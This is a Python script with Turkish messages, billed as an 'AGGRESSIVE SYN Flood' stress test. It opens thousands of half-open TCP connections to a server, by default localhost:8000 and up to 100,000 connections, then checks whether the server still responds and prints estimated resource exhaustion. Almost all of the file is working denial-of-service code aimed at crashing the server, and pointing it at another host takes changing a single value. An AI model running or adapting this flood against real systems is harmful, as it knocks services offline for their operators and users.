"""
AGGRESSIVE SYN Flood - Server'ı Gerçekten Test Et
1000+ connection ile server'ı zorla!
"""

import socket
import time
import threading
from datetime import datetime
from colorama import init, Fore, Style
import sys

init()

# Global stats
stats = {
    "successful": 0,
    "failed": 0,
    "timeout": 0,
    "active_sockets": []
}

def print_banner():
    banner = f"""
{Fore.RED}
╔═══════════════════════════════════════════════════════╗
║   🔴🔴🔴 AGGRESSIVE SYN FLOOD ATTACK 🔴🔴🔴          ║
║   HEAVY DoS Test - Server Stress Test                ║
╠═══════════════════════════════════════════════════════╣
║  Target: localhost:8000                               ║
║  Connections: 1000+ (configurable)                    ║
║  Goal: CRASH THE SERVER (test only!)                  ║
╚═══════════════════════════════════════════════════════╝
{Style.RESET_ALL}
"""
    print(banner)

def create_massive_connections(host, port, count, batch_size=100):
    """Toplu half-open connection oluştur"""
    
    print(f"{Fore.YELLOW}[ATTACK] {count} adet connection gönderiliyor...{Style.RESET_ALL}\n")
    
    batches = count // batch_size
    
    for batch in range(batches):
        batch_start = time.time()
        batch_sockets = []
        
        # Batch içinde paralel connection'lar
        for i in range(batch_size):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.setblocking(False)
                
                try:
                    sock.connect((host, port))
                except BlockingIOError:
                    pass  # Normal, non-blocking
                except Exception:
                    stats["failed"] += 1
                    continue
                
                batch_sockets.append(sock)
                stats["successful"] += 1
                
            except Exception:
                stats["failed"] += 1
        
        stats["active_sockets"].extend(batch_sockets)
        
        batch_time = (time.time() - batch_start) * 1000
        
        # Progress göster
        progress = ((batch + 1) / batches) * 100
        print(f"[Batch {batch+1:2d}/{batches:2d}] "
              f"{Fore.GREEN}✅ {len(batch_sockets)}{Style.RESET_ALL} connections "
              f"({batch_time:.0f}ms) | "
              f"Total: {Fore.CYAN}{len(stats['active_sockets'])}{Style.RESET_ALL} | "
              f"Progress: {progress:.0f}%")
    
    return stats["active_sockets"]

def stress_test_server(host, port, total_connections=1000):
    """Agresif DoS testi"""
    
    print(f"{Fore.RED}{'═' * 70}{Style.RESET_ALL}")
    print(f"{Fore.RED}PHASE 1: MASSIVE CONNECTION FLOOD{Style.RESET_ALL}")
    print(f"{Fore.RED}{'═' * 70}{Style.RESET_ALL}\n")
    
    start_time = time.time()
    
    # Massive connections
    sockets = create_massive_connections(host, port, total_connections, batch_size=100)
    
    flood_time = time.time() - start_time
    
    print(f"\n{Fore.YELLOW}{'─' * 70}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}FLOOD SONUÇLARI:{Style.RESET_ALL}")
    print(f"  Total Time: {flood_time:.2f}s")
    print(f"  Connections/sec: {len(sockets)/flood_time:.0f}")
    print(f"  Active Half-Open: {Fore.RED}{len(sockets)}{Style.RESET_ALL}")
    print(f"  Failed: {stats['failed']}")
    print(f"{Fore.YELLOW}{'─' * 70}{Style.RESET_ALL}\n")
    
    # Server cevap veriyor mu?
    print(f"{Fore.RED}{'═' * 70}{Style.RESET_ALL}")
    print(f"{Fore.RED}PHASE 2: SERVER HEALTH CHECK{Style.RESET_ALL}")
    print(f"{Fore.RED}{'═' * 70}{Style.RESET_ALL}\n")
    
    print(f"{Fore.CYAN}[TEST] Server'a yeni bağlantı deneniyor...{Style.RESET_ALL}\n")
    
    # 5 kez dene
    for attempt in range(1, 6):
        try:
            test_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            test_sock.settimeout(10)  # 10 saniye timeout
            
            test_start = time.time()
            test_sock.connect((host, port))
            test_time = (time.time() - test_start) * 1000
            test_sock.close()
            
            if test_time > 5000:  # 5 saniyeden uzun
                print(f"[Attempt {attempt}] {Fore.YELLOW}⚠️  YAVAŞ! Server zorlanıyor ({test_time:.0f}ms){Style.RESET_ALL}")
            else:
                print(f"[Attempt {attempt}] {Fore.GREEN}✅ Server cevap verdi ({test_time:.0f}ms){Style.RESET_ALL}")
            
            time.sleep(1)
            
        except socket.timeout:
            print(f"[Attempt {attempt}] {Fore.RED}❌ TIMEOUT! Server cevap vermiyor!{Style.RESET_ALL}")
            print(f"{Fore.RED}🚨🚨🚨 DoS BAŞARILI - Server DOWN! 🚨🚨🚨{Style.RESET_ALL}")
            break
        except Exception as e:
            print(f"[Attempt {attempt}] {Fore.RED}❌ ERROR: {e}{Style.RESET_ALL}")
    
    # Kaynak tüketimi tahmini
    print(f"\n{Fore.RED}{'═' * 70}{Style.RESET_ALL}")
    print(f"{Fore.RED}PHASE 3: RESOURCE EXHAUSTION ANALYSIS{Style.RESET_ALL}")
    print(f"{Fore.RED}{'═' * 70}{Style.RESET_ALL}\n")
    
    memory_kb = len(sockets) * 4  # Her socket ~4KB
    buffers_kb = len(sockets) * 16  # Network buffers ~16KB
    
    print(f"{Fore.YELLOW}SERVER KAYNAK KULLANIMI (TAHMİNİ):{Style.RESET_ALL}")
    print(f"  Half-Open Connections: {Fore.RED}{len(sockets)}{Style.RESET_ALL}")
    print(f"  Memory Usage: ~{Fore.RED}{memory_kb}KB{Style.RESET_ALL} ({memory_kb/1024:.1f}MB)")
    print(f"  Network Buffers: ~{Fore.RED}{buffers_kb}KB{Style.RESET_ALL} ({buffers_kb/1024:.1f}MB)")
    print(f"  File Descriptors: {Fore.RED}{len(sockets)}{Style.RESET_ALL}")
    print(f"  Total Resource: ~{Fore.RED}{(memory_kb + buffers_kb)/1024:.1f}MB{Style.RESET_ALL}\n")
    
    # Bekleme
    wait_time = 15
    print(f"{Fore.YELLOW}[INFO] {wait_time} saniye bekleniyor (Server zorlanıyor...)...{Style.RESET_ALL}\n")
    
    for i in range(wait_time):
        remaining = wait_time - i
        sys.stdout.write(f"\r{Fore.CYAN}[{i+1}/{wait_time}] Bekleniyor... "
                        f"({len(sockets)} aktif connection) "
                        f"Kalan: {remaining}s {Style.RESET_ALL}")
        sys.stdout.flush()
        time.sleep(1)
    
    print("\n")
    
    # Cleanup
    print(f"{Fore.YELLOW}{'─' * 70}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}CLEANUP BAŞLIYOR...{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}{'─' * 70}{Style.RESET_ALL}\n")
    
    for i, sock in enumerate(sockets):
        try:
            sock.close()
            if (i + 1) % 100 == 0:
                percent = ((i + 1) / len(sockets)) * 100
                sys.stdout.write(f"\r{Fore.GREEN}[{i+1}/{len(sockets)}] Kapatılıyor... {percent:.0f}%{Style.RESET_ALL}")
                sys.stdout.flush()
        except:
            pass
    
    print(f"\n{Fore.GREEN}✅ Tüm socket'ler kapatıldı{Style.RESET_ALL}\n")
    
    # Final değerlendirme
    print(f"{Fore.RED}{'═' * 70}{Style.RESET_ALL}")
    print(f"{Fore.RED}SONUÇ{Style.RESET_ALL}")
    print(f"{Fore.RED}{'═' * 70}{Style.RESET_ALL}\n")
    
    if len(sockets) > 500:
        print(f"{Fore.RED}🔴 CRITICAL VULNERABILITY!{Style.RESET_ALL}")
        print(f"{Fore.RED}   Server {len(sockets)} adet half-open connection kabul etti!{Style.RESET_ALL}")
        print(f"{Fore.RED}   Connection limit YOK!{Style.RESET_ALL}")
        print(f"{Fore.RED}   Gerçek saldırıda server ÇÖKER!{Style.RESET_ALL}\n")
        
        print(f"{Fore.YELLOW}GERÇEKProduction'da olsa ne olurdu?{Style.RESET_ALL}")
        print(f"  - Saldırgan 10,000+ connection gönderir")
        print(f"  - Server memory dolar")
        print(f"  - Yeni kullanıcılar bağlanamaz")
        print(f"  - Server crash eder")
        print(f"  - Downtime = Revenue loss")
        
    else:
        print(f"{Fore.GREEN}✅ Server connection limit çalışıyor!{Style.RESET_ALL}")

if __name__ == "__main__":
    print_banner()
    
    print(f"{Fore.RED}{'!' * 70}{Style.RESET_ALL}")
    print(f"{Fore.RED}⚠️⚠️⚠️  UYARI: AGRESİF DoS TESTİ! ⚠️⚠️⚠️{Style.RESET_ALL}")
    print(f"{Fore.RED}{'!' * 70}{Style.RESET_ALL}\n")
    
    print(f"{Fore.YELLOW}Bu test server'ı GERÇEKTEN zorlayacak!{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}Localhost'ta test ediyorsunuz, kendi bilgisayarınız yavaşlayabilir!{Style.RESET_ALL}\n")
    
    # Kullanıcıdan onay al
    print(f"{Fore.CYAN}Kaç connection göndermek istersiniz?{Style.RESET_ALL}")
    print(f"  - 100: Hafif test")
    print(f"  - 1000: Orta test")
    print(f"  - 5000: Ağır test") 
    print(f"  - 10000: EXTREME test")
    print(f"  - 50000: MASSIVE test (⚠️ Very Risky!)")
    print(f"  - 100000: {Fore.RED}NUCLEAR test (⚠️⚠️ EXTREMELY Risky!){Style.RESET_ALL}\n")
    
    try:
        count = int(input(f"{Fore.CYAN}Connection sayısı (default 10000): {Style.RESET_ALL}") or "10000")
        
        if count > 10000:
            print(f"\n{Fore.RED}⚠️⚠️⚠️  {count} connection ÇOK RİSKLİ!{Style.RESET_ALL}")
            print(f"{Fore.RED}Bu server'ı ve bilgisayarınızı DONDURABİLİR!{Style.RESET_ALL}")
            print(f"{Fore.RED}Hafızanız dolabilir, sistem kilitlenebilir!{Style.RESET_ALL}\n")
            confirm = input(f"{Fore.RED}Yine de devam etmek istediğinize EMİN misiniz? (YES/no): {Style.RESET_ALL}")
            if confirm != "YES":  # Büyük harfle YES yazmalı
                print(f"{Fore.YELLOW}Test iptal edildi. Güvenli seçim!{Style.RESET_ALL}")
                exit(0)
        
    except ValueError:
        count = 1000
        print(f"{Fore.YELLOW}Default 1000 connection kullanılıyor.{Style.RESET_ALL}")
    
    print(f"\n{Fore.GREEN}Test başlatılıyor: {count} connections...{Style.RESET_ALL}\n")
    time.sleep(2)
    
    stress_test_server("localhost", 8000, total_connections=count)
    
    print(f"\n{Fore.GREEN}✅ Agresif test tamamlandı!{Style.RESET_ALL}\n")
